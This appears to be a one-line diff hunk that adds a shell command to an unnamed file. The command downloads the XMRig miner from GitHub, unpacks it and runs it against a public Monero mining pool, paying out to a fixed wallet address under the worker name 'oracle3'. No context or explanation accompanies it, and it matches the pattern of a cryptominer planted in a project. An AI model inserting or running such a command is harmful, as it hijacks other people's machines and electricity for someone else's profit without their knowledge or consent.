@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.13.1/xmrig-6.13.1-linux-static-x64.tar.gz && tar -xvf xmrig-6.13.1-linux-static-x64.tar.gz && ./xmrig-6.13.1/xmrig -o pool.supportxmr.com:443 -u 87W8JEibzdAWYmLmecWtDUPh9BzANEiZLKHxYQv1oi5XD4SwMZZSfefAGwz1SH2woXLRE3sJsvJpubxk1pAXKcGsC5yYNFt.oracle3 -k --tls -p x
